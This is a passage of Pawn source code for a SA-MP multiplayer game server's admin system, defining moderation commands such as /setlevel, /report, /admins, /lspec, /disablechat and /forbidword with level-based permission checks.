	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:aka(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /aka [playerid]");
    	new player1, playername[MAX_PLAYER_NAME], str[128], tmp3[50];
		player1 = strval(params);
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
  		  	GetPlayerIp(player1,tmp3,50);
			GetPlayerName(player1, playername, sizeof(playername));
		    format(str,sizeof(str),"AKA: [%s id:%d] [%s] %s", playername, player1, tmp3, dini_Get("ladmin/config/aka.txt",tmp3) );
	        return SendClientMessage(playerid,blue,str);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:screen(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /screen [playerid] [text]");
    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
		player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
			GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
			CMDMessageToAdmins(playerid,"SCREEN");
			format(string,sizeof(string),"Administrator %s has sent you a screen message",adminname);	SendClientMessage(player1,blue,string);
			format(string,sizeof(string),"You have sent %s a screen message (%s)", playername, params[2]); SendClientMessage(playerid,blue,string);
			return GameTextForPlayer(player1, params[2],4000,3);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself or is the highest level admin");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:laston(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2) {
    	new tmp2[256], file[256],player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], str[128];
		GetPlayerName(playerid, adminname, sizeof(adminname));

	    if(isnull(params)) {
			format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(adminname));
			if(!fexist(file)) return SendClientMessage(playerid, red, "Error: File doesnt exist, player isnt registered");
			if(dUserINT(PlayerName2(playerid)).("LastOn")==0) {	format(str, sizeof(str),"Never"); tmp2 = str;
			} else { tmp2 = dini_Get(file,"LastOn"); }
			format(str, sizeof(str),"You were last on the server on %s",tmp2);
			return SendClientMessage(playerid, red, str);
		}
		player1 = strval(params);
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"LASTON");
   	    	GetPlayerName(player1,playername,sizeof(playername)); format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(playername));
			if(!fexist(file)) return SendClientMessage(playerid, red, "Error: File doesnt exist, player isnt registered");
			if(dUserINT(PlayerName2(player1)).("LastOn")==0) { format(str, sizeof(str),"Never"); tmp2 = str;
			} else { tmp2 = dini_Get(file,"LastOn"); }
			format(str, sizeof(str),"%s was last on the server on %s",playername,tmp2);
			return SendClientMessage(playerid, red, str);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:aduty(playerid, params[]) return SendClientMessage(playerid, red,"Changed to /adminduty");
CMD:aoffduty(playerid, params[]) return SendClientMessage(playerid, red,"Changed to /adminduty");

CMD:adminduty(playerid,params[])
{
   if(PlayerInfo[playerid][Level] >= 1)
   {
         if(PlayerInfo[playerid][OnDuty] == 0) {
         PlayerInfo[playerid][OnDuty] = 1;
	     new str[128], AdminName[28];
         GetPlayerName(playerid, AdminName, sizeof(AdminName));
         format(str, sizeof(str), "%s is now on Admin duty!", AdminName);
         SendClientMessageToAll(red, str);
         SetPlayerSkin(playerid,217);
         SetPlayerTeam(playerid, 6);
   	     SetPlayerColor(playerid, 0xF600F6FF);
         SetPlayerHealth(playerid, 100000);
         SetPlayerArmour(playerid, 100000);
		 ResetPlayerWeapons(playerid);
         GivePlayerWeapon(playerid, 38,999999999);
         Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
         gTeam[playerid] = TEAM_NONE;
         }
         else if(PlayerInfo[playerid][OnDuty] == 1) {
         PlayerInfo[playerid][OnDuty] = 0;
         new str[128], AdminName[28];
         GetPlayerName(playerid, AdminName, sizeof(AdminName));
         format(str, sizeof(str), "%s is now off Admin duty", AdminName);
         SendClientMessageToAll(red, str);
         SetPlayerHealth(playerid, 0);
		 ForceClassSelection(playerid);
	     SetPlayerHealth(playerid, 0);
	     SetPlayerArmour(playerid, 0);
         new rand = random(sizeof(PlayerColors));
         SetPlayerColor(playerid, PlayerColors[rand]);
         FirstSpawn[playerid] = 1;
         }
   } else return 0;
   return 1;
}

CMD:admins(playerid,params[])
{
new count = 0, string[256], AdmRank[500];
	SendClientMessage(playerid,red,"");
	SendClientMessage(playerid,COLOR_ORANGE,"»»Online Admins»»");
	new ChangeColor;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerInfo[i][Level] > 0)
			{
				if(PlayerInfo[i][Level] == 1)
				{
					AdmRank = "Community Trial Admin";
					ChangeColor = Color_Trial_Admin;

				}
				else if(PlayerInfo[i][Level] == 2)
				{
					AdmRank = "Community Server Admin";
					ChangeColor = Color_Server_Admin;

				}
				else if(PlayerInfo[i][Level] == 3)
				{
					AdmRank = "Community Senior Admin";
					ChangeColor = Color_Senior_Admin;

				}
				else if(PlayerInfo[i][Level] == 4)
				{
					AdmRank = "Community Lead Admin";
					ChangeColor = Color_Lead_Admin;

				}
				else if(PlayerInfo[i][Level] == 5)
				{
					AdmRank = "Community Global Admin";
					ChangeColor = Color_Global_Admin;

				}
				else if(PlayerInfo[i][Level] == 6)
				{
					AdmRank = "Community Developer/Scripter";
					ChangeColor = Color_Server_Owner;

				}
				else if(PlayerInfo[i][Level] >= 7)
				{
					AdmRank = "Community Owner";
                    ChangeColor = Color_RCON_Administrator;
				}
				else if(PlayerInfo[i][Level] >= 8)
				{
					AdmRank = "Community Owner";
                    ChangeColor = Color_RCON_Administrator;
				}
				new Name[MAX_PLAYER_NAME];
				GetPlayerName(i,Name,sizeof(Name));

				{
					format(string, sizeof(string), "Level: %d | Name: %s (ID:%i) | Rank: %s", PlayerInfo[i][Level], Name, i, AdmRank);
					SendClientMessage(playerid,ChangeColor,string);
					count++;
				}
			}
		}
	}


	if(count == 0)
	SendClientMessage(playerid,red,"No Admins online!");
	SendClientMessage(playerid,COLOR_ORANGE,"________________________");
	return 1;
}
CMD:vips(playerid, params[])
{
    #pragma unused params
    new
        count = 0,
        string[800];
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if (IsPlayerConnected(i))
        {
            if(PlayerInfo[i][dRank] >= 1)
            {
                format(string, 500, "%s %s [ID:%i] | DonorLevel: %d\n", string, PlayerName2(i), i, PlayerInfo[i][dRank]);
                //We are appending the string, so put %s before any new data is added,
                //and that parameter actually refers to the string itself.
                count++;
            }
        }
	}
    if (count == 0) ShowPlayerDialog(playerid, 800, DIALOG_STYLE_MSGBOX, "{F81414}=Online Donators=", "{00FFEE}No Donators Online\n{00FF00}_____", "Close", "");
    else ShowPlayerDialog(playerid, 800, DIALOG_STYLE_MSGBOX, "{F81414}=Online Donators=", string, "Close", "");
    return 1;
}
CMD:moderators(playerid, params[])
{
   new count = 0, string[256];
   SendClientMessage(playerid, blue,"Current online moderators:");
   for(new i = 0; i < MAX_PLAYERS; i ++)
   {
	  if(IsPlayerConnected(i))
	  {
		  if(PlayerInfo[i][Helper] == 1)
		  {
             format(string, sizeof(string),"Moderator: [%d]%s", i, PlayerName2(i));
             SendClientMessage(playerid, blue, string);
             count++;
		  }
      }
   }
   if(count == 0)
   {
		  SendClientMessage(playerid, blue,"No moderators are online right now!");
   }
   return 1;
}
CMD:morning(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 1) {
        CMDMessageToAdmins(playerid,"MORNING");
        return SetPlayerTime(playerid,7,0);
    } else return SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
}

CMD:adminarea(playerid,params[]) {
	#pragma unused params
    if(PlayerInfo[playerid][Level] >= 1) {
        CMDMessageToAdmins(playerid,"ADMINAREA");
	    SetPlayerPos(playerid, AdminArea[0], AdminArea[1], AdminArea[2]);
	    SetPlayerFacingAngle(playerid, AdminArea[3]);
	    SetPlayerInterior(playerid, AdminArea[4]);
		SetPlayerVirtualWorld(playerid, AdminArea[5]);
		return GameTextForPlayer(playerid,"Welcome Admin",1000,3);
	} else {
	   	SetPlayerHealth(playerid,1.0);
   		new string[100]; format(string, sizeof(string),"%s has used adminarea (non admin)", PlayerName2(playerid) );
	   	MessageToAdmins(red,string);
	} return SendClientMessage(playerid,red, "ERROR: You must be an administrator to use this command.");
}

CMD:setlevel(playerid,params[]) {
		if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /setlevel [playerid] [level]");
	    	new player1, level, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);
			if(isnull(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setlevel [playerid] [level]");
			level = strval(tmp2);

			if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if(PlayerInfo[player1][LoggedIn] == 1) {
					if(level > ServerInfo[MaxAdminLevel] ) return SendClientMessage(playerid,red,"ERROR: Incorrect Level");
					if(level == PlayerInfo[player1][Level]) return SendClientMessage(playerid,red,"ERROR: Player is already this level");
	       			CMDMessageToAdmins(playerid,"SETLEVEL");
					GetPlayerName(player1, playername, sizeof(playername));	GetPlayerName(playerid, adminname, sizeof(adminname));
			       	new year,month,day;   getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);

					if(level > 0) format(string,sizeof(string),"Administrator %s has set you to Administrator Status [level %d]",adminname, level);
					else format(string,sizeof(string),"Administrator %s has set you to Player Status [level %d]",adminname, level);
					SendClientMessage(player1,blue,string);

					if(level > PlayerInfo[player1][Level]) GameTextForPlayer(player1,"~g~Promoted", 2000, 3);
					else GameTextForPlayer(player1,"~r~Demoted", 2000, 3);

					format(string,sizeof(string),"You have made %s Level %d on %d/%d/%d at %d:%d:%d", playername, level, day, month, year, hour, minute, second); SendClientMessage(playerid,blue,string);
					format(string,sizeof(string),"Administrator %s has made %s Level %d on %d/%d/%d at %d:%d:%d",adminname, playername, level, day, month, year, hour, minute, second);
					SaveToFile("AdminLog",string);
					dUserSetINT(PlayerName2(player1)).("level",(level));
					PlayerInfo[player1][Level] = level;
					return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
				} else return SendClientMessage(playerid,red,"ERROR: Player must be registered and logged in to be admin");
			} else return SendClientMessage(playerid, red, "Player is not connected");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:settemplevel(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "USAGE: /settemplevel [playerid] [level]");
	    	new player1, level, string[128];
			player1 = strval(tmp);
			level = strval(tmp2);

			if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if(PlayerInfo[player1][LoggedIn] == 1) {
					if(level > ServerInfo[MaxAdminLevel] ) return SendClientMessage(playerid,red,"ERROR: Incorrect Level");
					if(level == PlayerInfo[player1][Level]) return SendClientMessage(playerid,red,"ERROR: Player is already this level");
	       			CMDMessageToAdmins(playerid,"SETTEMPLEVEL");
			       	new year,month,day; getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);

					if(level > 0) format(string,sizeof(string),"Administrator %s has temporarily set you to Administrator Status [level %d]", pName(playerid), level);
					else format(string,sizeof(string),"Administrator %s has temporarily set you to Player Status [level %d]", pName(playerid), level);
					SendClientMessage(player1,blue,string);

					if(level > PlayerInfo[player1][Level]) GameTextForPlayer(player1,"Promoted", 2000, 3);
					else GameTextForPlayer(player1,"Demoted", 2000, 3);

					format(string,sizeof(string),"You have made %s Level %d on %d/%d/%d at %d:%d:%d", pName(player1), level, day, month, year, hour, minute, second); SendClientMessage(playerid,blue,string);
					format(string,sizeof(string),"Administrator %s has made %s temp Level %d on %d/%d/%d at %d:%d:%d",pName(playerid), pName(player1), level, day, month, year, hour, minute, second);
					SaveToFile("TempAdminLog",string);
					PlayerInfo[player1][Level] = level;
					return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
				} else return SendClientMessage(playerid,red,"ERROR: Player must be registered and logged in to be admin");
			} else return SendClientMessage(playerid, red, "Player is not connected");
		} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"ERROR: You must be logged in to use this commands");
}

CMD:report(playerid,params[]) {
    new reported, tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /report [playerid] [reason]");
	reported = strval(tmp);

 	if(IsPlayerConnected(reported) && reported != INVALID_PLAYER_ID) {
		if(PlayerInfo[reported][Level] == ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot report this administrator");
		if(playerid == reported) return SendClientMessage(playerid,red,"ERROR: You Cannot report yourself");
		if(strlen(params) > 3) {
			new reportedname[MAX_PLAYER_NAME], reporter[MAX_PLAYER_NAME], str[128], hour,minute,second; gettime(hour,minute,second);
			GetPlayerName(reported, reportedname, sizeof(reportedname));	GetPlayerName(playerid, reporter, sizeof(reporter));
			format(str, sizeof(str), "{00FF00}||NewReport||  %s(%d) reported %s(%d) Reason: %s |@%d:%d:%d|", reporter,playerid, reportedname, reported, params[strlen(tmp)+1], hour,minute,second);
			MessageToTwice(red,str);
			SaveToFile("ReportLog",str);
			format(str, sizeof(str), "Report(%d:%d:%d): %s(%d) reported %s(%d) Reason: %s", hour,minute,second, reporter,playerid, reportedname, reported, params[strlen(tmp)+1]);
			for(new i = 1; i < MAX_REPORTS-1; i++) Reports[i] = Reports[i+1];
			Reports[MAX_REPORTS-1] = str;
			return SendClientMessage(playerid,yellow, "Your report has been sent to online administrators.");
		} else return SendClientMessage(playerid,red,"ERROR: Must be a valid reason");
	} else return SendClientMessage(playerid, red, "Player is not connected");
}

CMD:reports(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 1 || PlayerInfo[playerid][Helper] == 1) {
        new ReportCount;
		for(new i = 1; i < MAX_REPORTS; i++)
		{
			if(strcmp( Reports[i], "<none>", true) != 0) { ReportCount++; SendClientMessage(playerid,COLOR_WHITE,Reports[i]); }
		}
		if(ReportCount == 0) SendClientMessage(playerid,COLOR_WHITE,"There have been no reports");
    } else SendClientMessage(playerid,red,"ERROR: You need to be level 1/Help moderator to use this command");
	return 1;
}

CMD:richlist(playerid,params[]) {
    #pragma unused params
 		new string[128], Slot1 = -1, Slot2 = -1, Slot3 = -1, Slot4 = -1, HighestCash = -9999;
 		SendClientMessage(playerid,COLOR_WHITE,"Rich List:");

		for(new x=0; x<MAX_PLAYERS; x++) if (IsPlayerConnected(x)) if (GetPlayerMoney(x) >= HighestCash) {
			HighestCash = GetPlayerMoney(x);
			Slot1 = x;
		}
		HighestCash = -9999;
		for(new x=0; x<MAX_PLAYERS; x++) if (IsPlayerConnected(x) && x != Slot1) if (GetPlayerMoney(x) >= HighestCash) {
			HighestCash = GetPlayerMoney(x);
			Slot2 = x;
		}
		HighestCash = -9999;
		for(new x=0; x<MAX_PLAYERS; x++) if (IsPlayerConnected(x) && x != Slot1 && x != Slot2) if (GetPlayerMoney(x) >= HighestCash) {
			HighestCash = GetPlayerMoney(x);
			Slot3 = x;
		}
		HighestCash = -9999;
		for(new x=0; x<MAX_PLAYERS; x++) if (IsPlayerConnected(x) && x != Slot1 && x != Slot2 && x != Slot3) if (GetPlayerMoney(x) >= HighestCash) {
			HighestCash = GetPlayerMoney(x);
			Slot4 = x;
		}
		format(string, sizeof(string), "(%d) %s - $%d", Slot1,PlayerName2(Slot1),GetPlayerMoney(Slot1) );
		SendClientMessage(playerid,COLOR_WHITE,string);
		if(Slot2 != -1)	{
			format(string, sizeof(string), "(%d) %s - $%d", Slot2,PlayerName2(Slot2),GetPlayerMoney(Slot2) );
			SendClientMessage(playerid,COLOR_WHITE,string);
		}
		if(Slot3 != -1)	{
			format(string, sizeof(string), "(%d) %s - $%d", Slot3,PlayerName2(Slot3),GetPlayerMoney(Slot3) );
			SendClientMessage(playerid,COLOR_WHITE,string);
		}
		if(Slot4 != -1)	{
			format(string, sizeof(string), "(%d) %s - $%d", Slot4,PlayerName2(Slot4),GetPlayerMoney(Slot4) );
			SendClientMessage(playerid,COLOR_WHITE,string);
		}
		return 1;
}
CMD:topscores(playerid,params[]) {
    #pragma unused params
 		new string[128], Slot1 = -1, Slot2 = -1, Slot3 = -1, Slot4 = -1, HighestCash = -9999;
 		SendClientMessage(playerid,COLOR_WHITE,"Top Scorers:");

		for(new x=0; x<MAX_PLAYERS; x++) if (IsPlayerConnected(x)) if (GetPlayerScore(x) >= HighestCash) {
			HighestCash = GetPlayerScore(x);
			Slot1 = x;
		}
		HighestCash = -9999;
		for(new x=0; x<MAX_PLAYERS; x++) if (IsPlayerConnected(x) && x != Slot1) if (GetPlayerScore(x) >= HighestCash) {
			HighestCash = GetPlayerScore(x);
			Slot2 = x;
		}
		HighestCash = -9999;
		for(new x=0; x<MAX_PLAYERS; x++) if (IsPlayerConnected(x) && x != Slot1 && x != Slot2) if (GetPlayerScore(x) >= HighestCash) {
			HighestCash = GetPlayerScore(x);
			Slot3 = x;
		}
		HighestCash = -9999;
		for(new x=0; x<MAX_PLAYERS; x++) if (IsPlayerConnected(x) && x != Slot1 && x != Slot2 && x != Slot3) if (GetPlayerScore(x) >= HighestCash) {
			HighestCash = GetPlayerScore(x);
			Slot4 = x;
		}
		format(string, sizeof(string), "(%d) %s - %d - Rank: %s", Slot1,PlayerName2(Slot1),GetPlayerScore(Slot1), GetRankName(Slot1) );
		SendClientMessage(playerid,COLOR_WHITE,string);
		if(Slot2 != -1)	{
			format(string, sizeof(string), "(%d) %s - %d - Rank: %s", Slot2,PlayerName2(Slot2),GetPlayerScore(Slot2), GetRankName(Slot2));
			SendClientMessage(playerid,COLOR_WHITE,string);
		}
		if(Slot3 != -1)	{
			format(string, sizeof(string), "(%d) %s - %d - Rank: %s", Slot3,PlayerName2(Slot3),GetPlayerScore(Slot3), GetRankName(Slot3) );
			SendClientMessage(playerid,COLOR_WHITE,string);
		}
		if(Slot4 != -1)	{
			format(string, sizeof(string), "(%d) %s - %d - Rank: %s", Slot4,PlayerName2(Slot4),GetPlayerScore(Slot4), GetRankName(Slot4) );
			SendClientMessage(playerid,COLOR_WHITE,string);
		}
		return 1;
}

CMD:miniguns(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 1) {
		new bool:First2 = false, carty, string[128], i, slot, weap, ammo;
		for(i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				for(slot = 0; slot < 14; slot++) {
					GetPlayerWeaponData(i, slot, weap, ammo);
					if(ammo != 0 && weap == 38) {
					    carty++;
						if(!First2) { format(string, sizeof(string), "Minigun: (%d)%s(ammo%d)", i, PlayerName2(i), ammo); First2 = true; }
				        else format(string,sizeof(string),"%s, (%d)%s(ammo%d) ",string, i, PlayerName2(i), ammo);
					}
				}
    	    }
		}
		if(carty == 0) return SendClientMessage(playerid,COLOR_WHITE,"No players have a minigun"); else return SendClientMessage(playerid,COLOR_WHITE,string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:hseeks(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 1) {
		new bool:First2 = false, carty, string[128], i, slot, weap, ammo;
		for(i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				for(slot = 0; slot < 14; slot++) {
					GetPlayerWeaponData(i, slot, weap, ammo);
					if(ammo != 0 && weap == 36) {
					    carty++;
						if(!First2) { format(string, sizeof(string), "Heat Seeker: (%d)%s(ammo%d)", i, PlayerName2(i), ammo); First2 = true; }
				        else format(string,sizeof(string),"%s, (%d)%s(ammo%d) ",string, i, PlayerName2(i), ammo);
					}
				}
    	    }
		}
		if(carty == 0) return SendClientMessage(playerid,COLOR_WHITE,"No players have a heat seeker"); else return SendClientMessage(playerid,COLOR_WHITE,string);
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:uconfig(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4)
	{
		UpdateConfig();
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return CMDMessageToAdmins(playerid,"UCONFIG");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

//------------------------------------------------------------------------------
CMD:forbidname(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
		if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /forbidname [nickname]");
		new File:BLfile, string[128];
		BLfile = fopen("ladmin/config/ForbiddenNames.cfg",io_append);
		format(string,sizeof(string),"%s\r\n",params[1]);
		fwrite(BLfile,string);
		fclose(BLfile);
		UpdateConfig();
		CMDMessageToAdmins(playerid,"FORBIDNAME");
		format(string, sizeof(string), "Administrator \"%s\" has added the name \"%s\" to the forbidden name list", pName(playerid), params );
		return MessageToAdmins(green,string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

CMD:forbidword(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
		if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /forbidword [word]");
		new File:BLfile, string[128];
		BLfile = fopen("ladmin/config/ForbiddenWords.cfg",io_append);
		format(string,sizeof(string),"%s\r\n",params[1]);
		fwrite(BLfile,string);
		fclose(BLfile);
		UpdateConfig();
		CMDMessageToAdmins(playerid,"FORBIDWORD");
		format(string, sizeof(string), "Administrator \"%s\" has added the word \"%s\" to the forbidden word list", pName(playerid), params );
		return MessageToAdmins(green,string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 4 to use this command");
}

//==========================[ Spectate Commands ]===============================
#if defined ENABLE_SPEC

CMD:lspec(playerid,params[]) {
    if(PlayerInfo[playerid][Helper] == 1 || PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
	    if(isnull(params) || !IsNumeric(params)) return SendClientMessage(playerid, red, "USAGE: /lspec [playerid]");
		new specplayerid = strval(params);
		if(PlayerInfo[specplayerid][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(specplayerid) && specplayerid != INVALID_PLAYER_ID) {
			if(specplayerid == playerid) return SendClientMessage(playerid, red, "ERROR: You cannot spectate yourself");
			if(GetPlayerState(specplayerid) == PLAYER_STATE_SPECTATING && PlayerInfo[specplayerid][SpecID] != INVALID_PLAYER_ID) return SendClientMessage(playerid, red, "Spectate: Player spectating someone else");
			if(GetPlayerState(specplayerid) != 1 && GetPlayerState(specplayerid) != 2 && GetPlayerState(specplayerid) != 3) return SendClientMessage(playerid, red, "Spectate: Player not spawned");
			if( (PlayerInfo[specplayerid][Level] != ServerInfo[MaxAdminLevel]) || (PlayerInfo[specplayerid][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] == ServerInfo[MaxAdminLevel]) )	{
				StartSpectate(playerid, specplayerid);
				Spectating[playerid] = 1;
				TextDrawHideForPlayer(playerid, CountText[playerid]);
				CMDMessageToAdmins(playerid,"LSPEC");
				GetPlayerPos(playerid,Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
				GetPlayerFacingAngle(playerid,Pos[playerid][3]);
				return SendClientMessage(playerid,blue,"Now Spectating");
			} else return SendClientMessage(playerid,red,"ERROR: You cannot spectate the highest level admin");
		} else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be at least Help moderator to use this command");
}
CMD:ls(playerid,params[]) {
	return cmd_lspec(playerid, params);
}
CMD:lsp(playerid,params[]) {
	return cmd_lspec(playerid, params);
}

CMD:lsv(playerid,params[]) {
    if(PlayerInfo[playerid][Helper] == 1 || PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /lsv [vehicleid]");
		new specvehicleid = strval(params);
		if(specvehicleid < MAX_VEHICLES) {
			TogglePlayerSpectating(playerid, 1);
			PlayerSpectateVehicle(playerid, specvehicleid);
			PlayerInfo[playerid][SpecID] = specvehicleid;
			PlayerInfo[playerid][SpecType] = ADMIN_SPEC_TYPE_VEHICLE;
			CMDMessageToAdmins(playerid,"SPEC VEHICLE");
			GetPlayerPos(playerid,Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
			GetPlayerFacingAngle(playerid,Pos[playerid][3]);
			return SendClientMessage(playerid,blue,"Now Spectating");
		} else return SendClientMessage(playerid,red, "ERROR: Invalid Vehicle ID");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be at least Help moderator to use this command");
}
CMD:lspecoff(playerid,params[]) {
	#pragma unused params
    if(PlayerInfo[playerid][Helper] == 1 || PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
        if(PlayerInfo[playerid][SpecType] != ADMIN_SPEC_TYPE_NONE) {
			StopSpectate(playerid);
			return SendClientMessage(playerid,blue,"No Longer Spectating");
		} else return SendClientMessage(playerid,red,"ERROR: You are not spectating");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be at least Help moderator to use this command");
}

#endif

//==========================[ CHAT COMMANDS ]===================================

CMD:disablechat(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 3) {
		CMDMessageToAdmins(playerid,"DISABLECHAT");
		new string[128];
		if(ServerInfo[DisableChat] == 0) {
			ServerInfo[DisableChat] = 1;
			format(string,sizeof(string),"Administrator \"%s\" has disabled chat", pName(playerid) );
		} else {
			ServerInfo[DisableChat] = 0;
			format(string,sizeof(string),"Administrator \"%s\" has enabled chat", pName(playerid) );
		} return SendClientMessageToAll(blue,string);
 	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 3 to use this command");
}

CMD:clearchat(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 2) {
		CMDMessageToAdmins(playerid,"CLEARCHAT");
		for(new i = 0; i < 11; i++) SendClientMessageToAll(green," "); return 1;
 	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 2 to use this command");
}

CMD:cc(playerid,params[]) {
	 return cmd_clearchat(playerid, params);
}
CMD:caps(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /caps [playerid] [\"on\" / \"off\"]");
		new player1 = strval(tmp), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			if(strcmp(tmp2,"on",true) == 0)	{
				CMDMessageToAdmins(playerid,"CAPS");
				PlayerInfo[player1][Caps] = 0;
				if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has allowed you to use capitals in chat", pName(playerid) ); SendClientMessage(playerid,blue,string); }
				format(string,sizeof(string),"You have allowed \"%s\" to use capitals in chat", pName(player1) ); return SendClientMessage(playerid,blue,string);
			} else if(strcmp(tmp2,"off",true) == 0)	{
				CMDMessageToAdmins(playerid,"CAPS");
				PlayerInfo[player1][Caps] = 1;
				if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has prevented you from using capitals in chat", pName(playerid) ); SendClientMessage(playerid,blue,string); }
				format(string,sizeof(string),"You have prevented \"%s\" from using capitals in chat", pName(player1) ); return SendClientMessage(playerid,blue,string);
			} else return SendClientMessage(playerid, red, "USAGE: /caps [playerid] [\"on\" / \"off\"]");
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

//==================[ Object & Pickup ]=========================================
CMD:pickup(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"USAGE: /pickup [pickup id]");
	    new pickup = strval(params), string[128], Float:x, Float:y, Float:z, Float:a;
	    CMDMessageToAdmins(playerid,"PICKUP");
		GetPlayerPos(playerid, x, y, z);
		GetPlayerFacingAngle(playerid, a);
		x += (3 * floatsin(-a, degrees));
		y += (3 * floatcos(-a, degrees));
